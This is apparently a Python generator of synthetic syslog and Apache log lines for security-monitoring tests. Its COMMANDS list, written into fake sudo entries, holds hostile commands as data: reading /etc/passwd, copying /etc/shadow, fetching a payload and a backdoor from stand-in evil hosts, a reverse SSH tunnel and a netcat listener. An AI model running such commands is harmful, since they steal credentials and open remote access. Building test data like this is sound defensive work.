import random
import time
from datetime import datetime, timedelta
from typing import List, Dict


# Realistic data pools
USERS = ["root", "admin", "john.doe", "jane.smith", "devops", "ubuntu", "postgres", "www-data", "nginx", "mysql"]
VALID_USERS = ["john.doe", "jane.smith", "devops", "ubuntu"]
INVALID_USERS = ["admin1", "root2", "test", "guest", "backup", "oracle", "mysql", "ftp"]
IPS = [
    "192.168.1.100", "192.168.1.105", "192.168.1.110", "10.0.0.50", "10.0.0.55",
    "172.16.0.10", "172.16.0.20", "203.0.113.50", "198.51.100.23", "45.33.32.156",
    "185.220.101.1", "91.189.89.42", "104.236.228.48", "128.199.143.211"
]
MALICIOUS_IPS = ["185.220.101.1", "91.189.89.42", "104.236.228.48", "203.0.113.50", "198.51.100.23"]
HOSTNAMES = ["webserver-01", "db-primary", "app-server-02", "dev-box", "prod-lb-01"]
SERVICES = ["sshd", "sudo", "apache2", "nginx", "kernel", "systemd", "cron", "fail2ban", "postfix", "docker"]
APACHE_PATHS = ["/", "/api/users", "/api/login", "/dashboard", "/admin", "/api/data", "/static/js/app.js", "/api/health", "/api/upload", "/api/reports"]
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH"]
HTTP_STATUS = [200, 200, 200, 200, 200, 200, 200, 301, 304, 400, 401, 403, 404, 500, 502, 503]
COMMANDS = [
    "ls -la", "cat /etc/passwd", "systemctl status nginx", "df -h", "top -bn1",
    "netstat -tlnp", "ps aux", "tail -f /var/log/syslog", "chmod 777 /tmp",
    "cp /etc/shadow /tmp/", "curl http://evil.com/payload", "wget http://malicious.com/backdoor",
    "ssh -R 8080:localhost:80 attacker.com", "nc -lvp 4444", "python3 -m http.server 8080"
]

# Scenario templates
SCENARIOS = {
    "normal_traffic": 0.5,       # 50% normal operations
    "failed_logins": 0.15,       # 15% failed login attempts
    "brute_force": 0.05,         # 5% brute force bursts
    "unusual_activity": 0.1,     # 10% unusual hour access
    "privilege_escalation": 0.05, # 5% sudo/privilege attempts
    "errors": 0.1,               # 10% system errors
    "suspicious": 0.05,          # 5% suspicious activity
}


class LogGenerator:
    def __init__(self):
        self.is_running = False
        self.log_count = 0

    def generate_syslog(self, timestamp: datetime = None) -> str:
        """Generate a realistic syslog line."""
        if not timestamp:
            timestamp = datetime.now()

        time_str = timestamp.strftime("%b %d %H:%M:%S")
        hostname = random.choice(HOSTNAMES)
        pid = random.randint(1000, 65535)

        # Choose scenario
        scenario = random.choices(
            list(SCENARIOS.keys()),
            weights=list(SCENARIOS.values()),
            k=1
        )[0]

        if scenario == "normal_traffic":
            return self._normal_log(time_str, hostname, pid, timestamp)
        elif scenario == "failed_logins":
            return self._failed_login_log(time_str, hostname, pid, timestamp)
        elif scenario == "brute_force":
            return self._brute_force_log(time_str, hostname, pid, timestamp)
        elif scenario == "unusual_activity":
            return self._unusual_hour_log(time_str, hostname, pid, timestamp)
        elif scenario == "privilege_escalation":
            return self._privilege_log(time_str, hostname, pid, timestamp)
        elif scenario == "errors":
            return self._error_log(time_str, hostname, pid, timestamp)
        elif scenario == "suspicious":
            return self._suspicious_log(time_str, hostname, pid, timestamp)

        return self._normal_log(time_str, hostname, pid, timestamp)

    def _normal_log(self, time_str, hostname, pid, timestamp):
        templates = [
            f"{time_str} {hostname} sshd[{pid}]: Accepted publickey for {random.choice(VALID_USERS)} from {random.choice(IPS)} port {random.randint(40000, 65535)} ssh2",
            f"{time_str} {hostname} systemd[1]: Started Session {random.randint(1, 999)} of User {random.choice(VALID_USERS)}.",
            f"{time_str} {hostname} CRON[{pid}]: ({random.choice(VALID_USERS)}) CMD (test -x /usr/sbin/anacron)",
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] random: crng init done",
            f"{time_str} {hostname} sshd[{pid}]: Received disconnect from {random.choice(IPS)} port {random.randint(40000, 65535)}:11: disconnected by user",
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] audit: type=1400 audit({timestamp.timestamp():.3f}:{random.randint(100, 999)}): apparmor=\"STATUS\" operation=\"profile_load\" profile=\"unconfined\" name=\"/usr/sbin/php-fpm*\"",
            f"{time_str} {hostname} sshd[{pid}]: pam_unix(sshd:session): session opened for user {random.choice(VALID_USERS)} by (uid=0)",
        ]
        return random.choice(templates)

    def _failed_login_log(self, time_str, hostname, pid, timestamp):
        user = random.choice(VALID_USERS + INVALID_USERS)
        ip = random.choice(MALICIOUS_IPS + IPS)
        templates = [
            f"{time_str} {hostname} sshd[{pid}]: Failed password for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
            f"{time_str} {hostname} sshd[{pid}]: Failed password for invalid user {user} from {ip} port {random.randint(40000, 65535)} ssh2",
            f"{time_str} {hostname} sshd[{pid}]: Invalid user {user} from {ip}",
            f"{time_str} {hostname} sshd[{pid}]: Connection closed by authenticating user {user} {ip} port {random.randint(40000, 65535)} [preauth]",
            f"{time_str} {hostname} sshd[{pid}]: Disconnected from authenticating user {user} {ip} port {random.randint(40000, 65535)} [preauth]",
        ]
        return random.choice(templates)

    def _brute_force_log(self, time_str, hostname, pid, timestamp):
        user = random.choice(VALID_USERS)
        ip = random.choice(MALICIOUS_IPS)
        return f"{time_str} {hostname} sshd[{pid}]: Failed password for {user} from {ip} port {random.randint(40000, 65535)} ssh2"

    def _unusual_hour_log(self, time_str, hostname, pid, timestamp):
        user = random.choice(VALID_USERS)
        ip = random.choice(IPS)
        templates = [
            f"{time_str} {hostname} sshd[{pid}]: Accepted password for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
            f"{time_str} {hostname} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/su -",
            f"{time_str} {hostname} sshd[{pid}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)",
        ]
        return random.choice(templates)

    def _privilege_log(self, time_str, hostname, pid, timestamp):
        user = random.choice(VALID_USERS)
        command = random.choice(COMMANDS)
        templates = [
            f"{time_str} {hostname} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
            f"{time_str} {hostname} su: pam_unix(su:session): session opened for user root by {user}(uid=1000)",
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] audit: type=1100 audit({timestamp.timestamp():.3f}:{random.randint(100, 999)}): pid={pid} uid=0 auid={random.randint(1000, 9999)} ses=1 msg='op=PAM:authentication grantors=pam_unix acct=\"root\" exe=\"/usr/bin/su\" hostname=? addr=? terminal=pts/0 res=success'",
        ]
        return random.choice(templates)

    def _error_log(self, time_str, hostname, pid, timestamp):
        templates = [
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] segfault at 7fff{random.randint(10000000, 99999999)} ip 00007f{random.randint(10000000, 99999999)} sp 00007fff{random.randint(10000000, 99999999)} error 6",
            f"{time_str} {hostname} apache2[{pid}]: [error] [pid {pid}] (socket_condition) apr_socket_accept: (client connection) (OS 104) Connection reset by peer",
            f"{time_str} {hostname} systemd[1]: {random.choice(SERVICES)}.service: Main process exited, code=killed, status=11/SEGV",
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] Out of memory: Killed process {random.randint(1000, 9999)} ({random.choice(SERVICES)})",
            f"{time_str} {hostname} sshd[{pid}]: fatal: Authenticated to invalid user",
        ]
        return random.choice(templates)

    def _suspicious_log(self, time_str, hostname, pid, timestamp):
        ip = random.choice(MALICIOUS_IPS)
        templates = [
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC={ip} DST=10.0.0.1 LEN=60 TTL=54 ID=12345 DF PROTO=TCP SPT={random.randint(40000, 65535)} DPT=22",
            f"{time_str} {hostname} fail2ban[{pid}]: [sshd] Ban {ip}",
            f"{time_str} {hostname} kernel: [{random.uniform(0, 100):.6f}] iptables DROP: IN=eth0 OUT= SRC={ip} DST=10.0.0.1 PROTO=TCP SPT={random.randint(40000, 65535)} DPT={random.choice([22, 80, 443, 3306, 5432, 8080])}",
            f"{time_str} {hostname} sshd[{pid}]: Connection closed by {ip} port {random.randint(40000, 65535)} [preauth]",
            f"{time_str} {hostname} postdrop[{pid}]: warning: UID mismatch: {random.choice(VALID_USERS)} -> nobody",
        ]
        return random.choice(templates)

    def generate_apache_log(self, timestamp: datetime = None) -> str:
        """Generate a realistic Apache access log line."""
        if not timestamp:
            timestamp = datetime.now()

        ip = random.choice(IPS + MALICIOUS_IPS)
        user = random.choice(VALID_USERS + ["-"])
        time_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0530")
        method = random.choice(HTTP_METHODS)
        path = random.choice(APACHE_PATHS)
        status = random.choice(HTTP_STATUS)
        size = random.randint(0, 50000)

        return f'{ip} - {user} [{time_str}] "{method} {path} HTTP/1.1" {status} {size}'


def generate_logs_batch(count: int = 10, include_anomalies: bool = True) -> List[str]:
    """Generate a batch of log lines."""
    generator = LogGenerator()
    logs = []

    for _ in range(count):
        if random.random() < 0.8:  # 80% syslog
            logs.append(generator.generate_syslog())
        else:  # 20% apache
            logs.append(generator.generate_apache_log())

    return logs


def generate_anomaly_burst(burst_type: str = "brute_force", count: int = 10) -> List[str]:
    """Generate a burst of anomalous logs."""
    generator = LogGenerator()
    logs = []

    for _ in range(count):
        if burst_type == "brute_force":
            logs.append(generator._brute_force_log(
                datetime.now().strftime("%b %d %H:%M:%S"),
                random.choice(HOSTNAMES),
                random.randint(1000, 65535),
                datetime.now()
            ))
        elif burst_type == "port_scan":
            ip = random.choice(MALICIOUS_IPS)
            timestamp = datetime.now()
            time_str = timestamp.strftime("%b %d %H:%M:%S")
            port = random.randint(1, 65535)
            logs.append(f"{time_str} {random.choice(HOSTNAMES)} kernel: [{random.uniform(0, 100):.6f}] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC={ip} DST=10.0.0.1 LEN=60 TTL=54 ID=12345 DF PROTO=TCP SPT={random.randint(40000, 65535)} DPT={port}")
        elif burst_type == "privilege":
            logs.append(generator._privilege_log(
                datetime.now().strftime("%b %d %H:%M:%S"),
                random.choice(HOSTNAMES),
                random.randint(1000, 65535),
                datetime.now()
            ))

    return logs


if __name__ == "__main__":
    gen = LogGenerator()
    print("=== Sample Generated Logs ===")
    for i in range(20):
        print(gen.generate_syslog())
    print("\n=== Sample Apache Logs ===")
    for i in range(5):
        print(gen.generate_apache_log())
